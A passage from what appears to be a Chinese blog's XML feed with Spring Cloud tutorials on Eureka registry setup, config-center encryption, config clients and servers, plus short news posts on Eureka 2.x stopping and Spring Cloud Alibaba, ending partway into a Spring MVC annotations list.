Cloud用到的配置解释。</p><p>**<code>spring.application.name</code>**：配置应用名称，在注册中心中显示的服务注册名称。</p><p>**<code>spring.cloud.client.ipAddress</code>**：获取客户端的IP地址。</p><p>**<code>eureka.instance.prefer-ip-address</code>**：配置为true为喜欢IP，即连接注册中心使用IP地址形式，也可以使用HOSTNAME，但生产环境不推荐。</p><p>**<code>eureka.instance.instance-id</code>**：配置在注册中心注册的唯一实例ID。</p><p>**<code>eureka.instance.lease-expiration-duration-in-seconds</code>**：指示eureka服务器在接收到最后一个心跳之后等待的时间（秒），然后才能从此视图中删除此实例，并禁止此实例的流量。将此值设置得太长可能意味着流量可以路由到实例，即使实例不存在。设置此值太小可能意味着，由于临时网络故障，实例可能会被取消流量。此值将设置为至少高于lease-renewal-interval-in-seconds中指定的值。</p><p>**<code>eureka.instance.lease-renewal-interval-in-seconds</code>**：指示eureka客户端需要向eureka服务器发送心跳以指示它仍然存在的频率（以秒为单位）。如果在lease-expiration-duration-in-seconds中指定的时间段内未收到心跳线，则eureka服务器将从其视图中删除该实例，因此不允许此实例的流量。请注意，如果该实例实现HealthCheckCallback，然后决定使其本身不可用，则该实例仍然可能无法访问流量。</p><p>**<code>eureka.server.enable-self-preservation</code>**：配置注册中心是否开启服务的自我保护功能。</p><p>**<code>eureka.server.eviction-interval-timer-in-ms</code>**：配置注册中心清理无效节点的时间间隔，默认60000毫秒，即60秒。</p><p>**<code>eureka.client.register-with-eureka</code>**：配置为true指示此实例将其信息注册到eureka服务器以供其他人发现。在某些情况下，您不希望发现实例，而您只想发现其他实例配置为false。</p><p>**<code>eureka.client.fetch-registry</code>**：指示该客户端是否应从eureka服务器获取eureka注册表信息。。</p><p>**<code>eureka.client.serviceUrl.defaultZone</code>**：Eureka服务器地址。</p><h2 id="启动注册中心"><a href="#启动注册中心" class="headerlink" title="启动注册中心"></a>启动注册中心</h2><p>这样一个两个注册心的Eureka Server就搭好了，启动的时候使用不同的Profile来指定不同的端口。</p><pre class="line-numbers language-none"><code class="language-none">spring-boot:run -Drun.profiles&#x3D;register-center1  -P devspring-boot:run -Drun.profiles&#x3D;register-center2  -P dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud 配置中心内容加密</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E5%86%85%E5%AE%B9%E5%8A%A0%E5%AF%86/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E5%86%85%E5%AE%B9%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>从配置获取的配置默认是明文的，有些像数据源这样的配置需要加密的话，需要对配置中心进行加密处理。</p><p>下面使用对称性加密来加密配置，需要配置一个密钥，当然也可以使用RSA非对称性加密，但对称加密比较方便也够用了，这里就以对称加密来配置即可。</p><h2 id="1、安装JCE"><a href="#1、安装JCE" class="headerlink" title="1、安装JCE"></a>1、安装JCE</h2><p>JDK下的JCR默认是有长度限制的，需要替换没有长度限制的JCE版本。</p><blockquote><p><a href="http://www.oracle.com/technetwork/java/javase/downloads/jce-7-download-432124.html">http://www.oracle.com/technetwork/java/javase/downloads/jce-7-download-432124.html</a></p></blockquote><p>把下载包里面的两个jar文件复制替换到JAVA_HOME&#x2F;jre&#x2F;lib&#x2F;security目录下。</p><h2 id="2、添加加密KEY"><a href="#2、添加加密KEY" class="headerlink" title="2、添加加密KEY"></a>2、添加加密KEY</h2><p>配置中心配置文件中加入加密密钥。</p><pre class="line-numbers language-none"><code class="language-none">encrypt:   key: 0e010e17-2529-4581-b907-c8edcfd6be09<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3、查看加密功能状态"><a href="#3、查看加密功能状态" class="headerlink" title="3、查看加密功能状态"></a>3、查看加密功能状态</h2><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.237:7100&#x2F;encrypt&#x2F;status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>功能正常会显示OK</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;status&quot;:&quot;OK&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、加密解密"><a href="#4、加密解密" class="headerlink" title="4、加密解密"></a>4、加密解密</h2><p>对<code>develop</code>字符串加密</p><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;192.168.1.237:7100&#x2F;encrypt -d  develop -u config-user:99282424-5939-4b08-a40f-87b2cbc403f6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对<code>develop</code>字符串解密</p><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;192.168.1.237:7100&#x2F;decrypt -d  0fb593294187a31f35dea15e8bafaf77745328dcc20d6d6dd0dfa5ae753d6836 -u config-user:99282424-5939-4b08-a40f-87b2cbc403f6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-u username:password 为basic认证</p><h2 id="5、配置文件"><a href="#5、配置文件" class="headerlink" title="5、配置文件"></a>5、配置文件</h2><pre class="line-numbers language-none"><code class="language-none">spring:   datasource:     username: &#39;&#123;cipher&#125;0fb593294187a31f35dea15e8bafaf77745328dcc20d6d6dd0dfa5ae753d6836&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>需要加密的内容以<code>{cipher}</code>开头，并注意要使节单引号包起来，不然报错。</p><h2 id="6、读取配置"><a href="#6、读取配置" class="headerlink" title="6、读取配置"></a>6、读取配置</h2><p>这样客户端读取出来的配置是自动解密了的，如果要关闭自动解密功能通过客户端自己来解密，同时也要保留加解密的端点可以通过关闭以下配置即可。</p><pre class="line-numbers language-none"><code class="language-none">spring.cloud.config.server.encrypt.enabled&#x3D;false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud 配置中心客户端读取配置</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>微服务连接配置中心来实现外部配置的读取。</p><h2 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h2><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-eureka&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-config&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-aop&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.retry&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-retry&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>spring-cloud-starter-config</code>：配置中心客户端的依赖。</p><p><code>spring-boot-starter-aop</code>,<code>spring-retry</code>：这两个是连接配置中心快速失败和重试需要用到的依赖。</p><h2 id="增加启动类"><a href="#增加启动类" class="headerlink" title="增加启动类"></a>增加启动类</h2><pre class="line-numbers language-none"><code class="language-none">@EnableDiscoveryClient@SpringBootApplicationpublic class ServiceApplication &#123;public static void main(String[] args) &#123;SpringApplication.run(ServiceApplication.class, args);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h2><p>在<code>bootstrap.yml</code>中添加如下配置，必须是bootstrap，application中不行。</p><pre class="line-numbers language-none"><code class="language-none">spring:   application:     name: config-client  cloud:    config:      #username:       #password:       name: $&#123;git.application&#125;      profile: $&#123;git.profile&#125;      label: $&#123;git.label&#125;      fail-fast: true      retry:        initial-interval: 2000        max-attempts: 5      discovery:         enabled: true        service-id: config-center       eureka:  client:     serviceUrl:      defaultZone: $&#123;register-center.urls&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出配置比较简单，下面也不再详述。</p><p><code>application.yml</code>配置文件参考如下：</p><pre class="line-numbers language-none"><code class="language-none">spring:   profiles:     active: config-client1    eureka:  instance:    prefer-ip-address: true      instance-id: $&#123;spring.cloud.client.ipAddress&#125;:$&#123;server.port&#125;    lease-expiration-duration-in-seconds: $&#123;lease-expiration-duration-in-seconds&#125;    lease-renewal-interval-in-seconds: $&#123;lease-renewal-interval-in-seconds&#125;---spring:   profiles: config-client1      server:   port: $&#123;config-client1.server.port&#125;      ---spring:   profiles: config-client2  server:   port: $&#123;config-client2.server.port&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Maven-filter配置"><a href="#Maven-filter配置" class="headerlink" title="Maven filter配置"></a>Maven filter配置</h2><pre class="line-numbers language-none"><code class="language-none">... #gitgit.application&#x3D;applicationgit.profile&#x3D;devgit.label&#x3D;master...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="读取配置"><a href="#读取配置" class="headerlink" title="读取配置"></a>读取配置</h2><pre class="line-numbers language-none"><code class="language-none">@RestControllerpublic class TestController &#123;@Value(&quot;$&#123;username&#125;&quot;)private String username;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用Value就能读取配置中心的配置，当然也可以通过其他方式获取SpringCloud中的配置，参考之前SpringBoot系列文章。</p><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><p>通过指定Profile启动两台微服务，它们可以读取配置中心的内容。</p><pre class="line-numbers language-none"><code class="language-none">spring-boot:run -Drun.profiles&#x3D;config-client1 -P devspring-boot:run -Drun.profiles&#x3D;config-client2 -P dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud 配置中心高可用搭建</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E9%AB%98%E5%8F%AF%E7%94%A8%E6%90%AD%E5%BB%BA/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E9%AB%98%E5%8F%AF%E7%94%A8%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>本文通过config server连接git仓库来实现配置中心，除了git还可以使用svn或者系统本地目录都行。</p><h2 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h2><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;    &lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-config-server&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-eureka&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>spring-cloud-config-server这个就是配置中心server的依赖。</p><p>配置中心做到高可用本身也需要向注册中心注册自己的实例，所以需求引用spring-cloud-starter-eureka依赖。</p><h2 id="添加启动类，开启Config-Server功能"><a href="#添加启动类，开启Config-Server功能" class="headerlink" title="添加启动类，开启Config Server功能"></a>添加启动类，开启Config Server功能</h2><pre class="line-numbers language-none"><code class="language-none">@EnableDiscoveryClient@EnableConfigServer@SpringBootApplicationpublic class ConfigApplication &#123;public static void main(String[] args) &#123;SpringApplication.run(ConfigApplication.class, args);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>@EnableConfigServer</code>：即开启配置服务器的功能。</p><p><code>@EnableDiscoveryClient</code>：开启自动注册客户端，默认情况下，ServiceRegistry实现将自动注册正在运行的服务。如注册中心使用是Eureka，这里也可以使用的@EnableEurekaClient注解。</p><h2 id="添加Config配置"><a href="#添加Config配置" class="headerlink" title="添加Config配置"></a>添加Config配置</h2><pre class="line-numbers language-none"><code class="language-none">spring:   application:    name: config-center  profiles:    active: config-center1  cloud:     config:      server:        git:          uri: $&#123;git.uri&#125;          searchPaths: $&#123;git.searchPaths&#125;          username: $&#123;git.username&#125;          password: $&#123;git.password&#125;          basedir: $&#123;git.basedir&#125;          clone-on-start: true          force-pull: true          eureka:  instance:     prefer-ip-address: true      instance-id: $&#123;spring.cloud.client.ipAddress&#125;:$&#123;server.port&#125;    lease-expiration-duration-in-seconds: $&#123;lease-expiration-duration-in-seconds&#125;    lease-renewal-interval-in-seconds: $&#123;lease-renewal-interval-in-seconds&#125;  client:    serviceUrl:      defaultZone: $&#123;register-center.urls&#125;    ---spring:  profiles: config-center1  server:   port: $&#123;config-center1.server.port&#125;---spring:   profiles: config-center2  server:   port: $&#123;config-center2.server.port&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里配置了两台Config Server，都注册到了两台注册中心上。</p><h2 id="Maven-filter配置"><a href="#Maven-filter配置" class="headerlink" title="Maven filter配置"></a>Maven filter配置</h2><pre class="line-numbers language-none"><code class="language-none">#gitgit.uri&#x3D;http:&#x2F;&#x2F;gitlab.example.com&#x2F;test&#x2F;config.gitgit.username&#x3D;rootgit.password&#x3D;rootgit.searchPaths&#x3D;config-centergit.basedir&#x3D;f:&#x2F;config&#x2F;config-center&#x2F;git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Spring-Cloud-Git配置详解"><a href="#Spring-Cloud-Git配置详解" class="headerlink" title="Spring Cloud Git配置详解"></a>Spring Cloud Git配置详解</h2><p>**<code>spring.cloud.config.server.git.uri</code>**：git仓库地址。</p><p>**<code>spring.cloud.config.server.git.searchPaths</code>**：git仓库搜索目录。</p><p>**<code>spring.cloud.config.server.git.username</code>**：连接git的用户名。</p><p>**<code>spring.cloud.config.server.git.password</code>**：连接git的用户名密码。</p><p>**<code>spring.cloud.config.server.git.basedir</code>**：配置中心在本地缓存配置的目录。</p><p>**<code>spring.cloud.config.server.git.clone-on-start</code>**：配置为true表示启动时就克隆配置缓存到本地。</p><p>**<code>spring.cloud.config.server.git.force-pull</code>**：配置为true表示如果本地副本是脏的，将使Spring Cloud Config Server强制从远程存储库拉取配置。</p><h2 id="启动配置中心"><a href="#启动配置中心" class="headerlink" title="启动配置中心"></a>启动配置中心</h2><p>分别启动以下配置中心，使用不同的Profile指定端口。</p><pre class="line-numbers language-none"><code class="language-none">spring-boot:run -Drun.profiles&#x3D;config-center1 -P devspring-boot:run -Drun.profiles&#x3D;config-center2 -P dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>凉凉了，Eureka 宣布停更，Spring Cloud 何去何从？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/%E5%87%89%E5%87%89%E4%BA%86%EF%BC%8CEureka%20%E5%AE%A3%E5%B8%83%E5%81%9C%E6%9B%B4%EF%BC%8CSpring%20Cloud%20%E4%BD%95%E5%8E%BB%E4%BD%95%E4%BB%8E%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/%E5%87%89%E5%87%89%E4%BA%86%EF%BC%8CEureka%20%E5%AE%A3%E5%B8%83%E5%81%9C%E6%9B%B4%EF%BC%8CSpring%20Cloud%20%E4%BD%95%E5%8E%BB%E4%BD%95%E4%BB%8E%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p><strong>今年 Dubbo 活了，并且被 Apache 收了。同时很不幸，Spring Cloud 下的 Netflix Eureka 组件项目居然宣布停止开发了。。</strong></p><p>已经从 Dubbo 迁移至 Spring Cloud 上的人，你们还好吗？</p><blockquote><p>闭源：<a href="https://github.com/Netflix/eureka/wiki">https://github.com/Netflix/eureka/wiki</a></p></blockquote><p><img src="http://img.javastack.cn/18-7-10/71721072.jpg"></p><p><strong>大概意思是：</strong> Eureka 2.0 的开源工作已经停止，依赖于开源库里面的 Eureka 2.x 分支构建的项目或者相关代码，风险自负！</p><h4 id="Eureka-是什么？"><a href="#Eureka-是什么？" class="headerlink" title="Eureka 是什么？"></a>Eureka 是什么？</h4><p>用 Spring Cloud 作为微服务框架的开发者应该都知道，Eureka 是其默认的也是推荐的服务注册中心组件。</p><p>既然首推 Eureka 作为服务注册中心组件也是因为 Netflix 优秀的各种套件，如 Zuul（服务网关组件）、Hystrix（熔断组件） 等都是 Spring Cloud 一站式解决方案。</p><p><strong>我们来看下 Eureka 和服务注册的关系图。</strong></p><p><img src="http://img.javastack.cn/18-7-10/66188885.jpg"></p><h4 id="Eureka-开源史末"><a href="#Eureka-开源史末" class="headerlink" title="Eureka 开源史末"></a>Eureka 开源史末</h4><p>Netflix 公司 2012 年将 Euerka 正式开源。</p><p><img src="http://img.javastack.cn/18-7-10/27687996.jpg"></p><p>Eureka 1.x 最新版本 1.9.3，不知道是否会成为 Eureka 最后的开源版本。</p><p><img src="http://img.javastack.cn/18-7-10/33405423.jpg"></p><p>本次 2.x 的的突然停止开发在其官网未到相关申明，希望不是闭源，是否开历史倒车，是否有其他阴谋，我们将持续跟进。</p><h4 id="Spring-Cloud-何去何从？"><a href="#Spring-Cloud-何去何从？" class="headerlink" title="Spring Cloud 何去何从？"></a>Spring Cloud 何去何从？</h4><p>对于 Eureka 2.x 的停止开发，Spring Cloud 将何去何从？后续会不会替换默认的服务注册组件呢？不得而知，Spring Cloud 版本发布很快，已经快跟不上了。</p><p>Eureka 2.x 还未发布正式版本，Spring Cloud 还是在 1.x 上面开发的，最新版本依赖 1.9.2，所以虽然国内大多数公司也在用 Eureka，但暂时不会受影响。</p><p><img src="http://img.javastack.cn/18-7-10/62658130.jpg"></p><p>1.x 相对稳定，也在持续更新，建议不要盲目升级或者切换到别的中间件。不过，随着 Eureka 2.x 的停更，后续还会不会有 3.x，如果没有，是否有必要迁移至 Consul、ZooKeeper、Etcd 等开源中间件上面去呢？</p><p>对于 Eureka 的闭源及带来的影响，你怎么看？欢迎留言讨论。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>厉害了，Spring Cloud for Alibaba 来了！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/%E5%8E%89%E5%AE%B3%E4%BA%86%EF%BC%8CSpring%20Cloud%20for%20Alibaba%20%E6%9D%A5%E4%BA%86%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/%E5%8E%89%E5%AE%B3%E4%BA%86%EF%BC%8CSpring%20Cloud%20for%20Alibaba%20%E6%9D%A5%E4%BA%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>最近，Spring Cloud 发布了 Spring Cloud Alibaba 首个预览版本：Spring Cloud for Alibaba 0.2.0.</p><p>大家都好奇，这和阿里巴巴有什么关系？莫非是给阿里巴巴定制了一个 Spring Cloud ?</p><p>其实也差不多，栈长带大家来看下这到底是个什么鬼？</p><h2 id="Spring-Cloud-for-Alibaba-是什么鬼？"><a href="#Spring-Cloud-for-Alibaba-是什么鬼？" class="headerlink" title="Spring Cloud for Alibaba 是什么鬼？"></a>Spring Cloud for Alibaba 是什么鬼？</h2><blockquote><p>官宣：<br><a href="https://spring.io/blog/2018/10/30/spring-cloud-for-alibaba-0-2-0-released">https://spring.io/blog/2018/10/30/spring-cloud-for-alibaba-0-2-0-released</a></p></blockquote><p>官方定义如下：</p><blockquote><p>The Spring Cloud Alibaba project, consisting of Alibaba’s open-source components and several Alibaba Cloud products, aims to implement and expose well known Spring Framework patterns and abstractions to bring the benefits of Spring Boot and Spring Cloud to Java developers using Alibaba products.</p></blockquote><p>栈长翻译：</p><blockquote><p>Spring Cloud for Alibaba，它是由一些阿里巴巴的开源组件和云产品组成的。这个项目的目的是为了让大家所熟知的 Spring 框架，其优秀的设计模式和抽象理念，以给使用阿里巴巴产品的 Java 开发者带来使用 Spring Boot 和 Spring Cloud 的更多便利。</p></blockquote><p>注意：这个项目是由阿里巴巴维护的开源社区项目。</p><h2 id="为什么首个版本为-0-2-0-？"><a href="#为什么首个版本为-0-2-0-？" class="headerlink" title="为什么首个版本为 0.2.0 ？"></a>为什么首个版本为 0.2.0 ？</h2><p>现在 Spring Boot 有两条线，即 Spring Boot 1.x 和 Spring Boot 2.x，所以 0.2.0 即是和 Spring Boot 2.x 兼容的，0.1.0 则是和 Spring Boot 1.x 兼容的。</p><p>这样就好理解了。。</p><h2 id="项目组成部分"><a href="#项目组成部分" class="headerlink" title="项目组成部分"></a>项目组成部分</h2><p>上面说的阿里巴巴开源组件，它的项目前缀是：spring-cloud-alibaba，它有几下几个特性。</p><ul><li>服务发现</li><li>配置管理</li><li>安全高可用性</li></ul><p>上面说的阿里巴巴云产品，它的项目前缀是：spring-cloud-alicloud，它有几下几个特性。</p><ul><li>应用命名服务</li><li>应用配置管理</li><li>对象存储服务</li></ul><h2 id="如何使用？"><a href="#如何使用？" class="headerlink" title="如何使用？"></a>如何使用？</h2><p>Spring Cloud for Alibaba 0.1.0.RELEASE 和 0.2.0.RELEASE 两个包都已经提交到了 Maven 中央仓库了。</p><p><img src="http://qianniu.javastack.cn/18-11-21/7555236.jpg"></p><p>Spring Cloud for Alibaba 0.2.0.RELEASE 的 Maven 依赖如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencyManagement&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;            &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;&#x2F;artifactId&gt;            &lt;version&gt;0.2.0.RELEASE&lt;&#x2F;version&gt;            &lt;type&gt;pom&lt;&#x2F;type&gt;            &lt;scope&gt;import&lt;&#x2F;scope&gt;        &lt;&#x2F;dependency&gt;    &lt;&#x2F;dependencies&gt;&lt;&#x2F;dependencyManagement&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h2><p><strong>1、RocketMQ</strong></p><p>RocketMQ 是阿里开源的基于 Java 的消息队列中间件，目前 Spring Cloud 集成的消息队列只有 Kafka 和 RabbitMQ, 后续 Spring Cloud Stream 和 Spring Cloud Bus 会集成 RocketMQ, 这个牛逼了，期待。。</p><p><strong>2、AliCloud SchedulerX</strong></p><p>阿里云SchedulerX，它是阿里巴巴中间件团队开发的一款分布式任务调度工具，支持循环任务和在指定时间触发任务。 </p><p><strong>3、AliCloud SLS</strong></p><p>阿里云SLS，一站式日志管理服务，是一款阿里巴巴集团行之有效的工具，经历了一次又一次的大数据挑战。它能在不污染任何代码的情况下，快速收集、使用、交付、查询和分析日志数据。</p><p><strong>4、Spring Cloud Release Train</strong></p><p>Spring Cloud Alibaba 项目将于 2019 年从孵化器毕业，到时会正式加入 Spring Cloud 正式版本轨道上来。</p><h2 id="项目源码"><a href="#项目源码" class="headerlink" title="项目源码"></a>项目源码</h2><blockquote><p><a href="https://github.com/spring-cloud-incubator/spring-cloud-alibaba">https://github.com/spring-cloud-incubator/spring-cloud-alibaba</a></p></blockquote><p><img src="http://qianniu.javastack.cn/18-11-21/59298333.jpg"></p><p>都 1700+ Star 了。。</p><h2 id="栈长有话说"><a href="#栈长有话说" class="headerlink" title="栈长有话说"></a>栈长有话说</h2><p>其实 Spring Cloud for Alibaba 项目就是为了阿里的项目能很好的结合融入 Spring Boot &amp; Cloud 使用，这个项目目前由阿里维护。</p><p>对同时使用 Spring Boot &amp; Cloud 和阿里巴巴项目的人来说无疑带来了巨大的便利，一方面能结合 Spring 无缝接入，另一方面还能使用阿里巴巴的组件，也带来了更多的可选择性。</p><p>在感受到 Dubbo 加入 Apache 孵化器后的蜕变《<a href="https://mp.weixin.qq.com/s/ZkFh851uwLJwT2cxYNuFWg">惊艳，Dubbo域名已改，也不再局限于Java！！</a>》，同时，现在更多优秀的阿里产品融入开源社区，相信 Java 开发环境会越来越好，Java 也会越来越强大！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MVC 常用注解</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20MVC/Spring%20MVC%20%E5%B8%B8%E7%94%A8%E6%B3%A8%E8%A7%A3/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20MVC/Spring%20MVC%20%E5%B8%B8%E7%94%A8%E6%B3%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h2><ul><li>Controller</li></ul><p>注解一个类表示控制器，Spring MVC会自动扫描标注了这个注解的类。</p><ul><li>RequestMapping</li></ul><p>请求路径映射，可以标注类，也可以是方法，可以指定请求类型，默认不指定为全部接收。</p><ul><li>RequestParam</li></ul><p>放在参数前，表示只能接收参数a&#x3D;b格式的数据，即<code>Content-Type</code>为<code>application/x-www-form-urlencoded</code>类型的内容。</p><ul><li>RequestBody</li></ul><p>放在参数前，表示参数从request body中获取，而不是从地址栏获取，所以这肯定是接收一个POST请求的非a&#x3D;b格式的数据，即<code>Content-Type</code>不为<code>application/x-www-form-urlencoded</code>类型的内容。</p><ul><li>ResponseBody</li></ul><p>放在方法上或者返回类型前，表示此方法返回的数据放在response body里面，而不是跳转页面。一般用于ajax请求，返回json数据。</p><ul><li>RestController</li></ul><p>这个是Controller和ResponseBody的组合注解，表示@Controller标识的类里面的所有返回参数都放在response body里面。</p><ul><li>PathVariable</li></ul><p>路径绑定变量，用于绑定restful路径上的变量。</p><ul><li>@RequestHeader</li></ul><p>放在方法参数前，用来获取request header中的参数值。</p><ul><li>@CookieValue;</li></ul><p>放在方法参数前，用来获取request header cookie中的参数值。</p><ul><li>GetMapping PostMapping 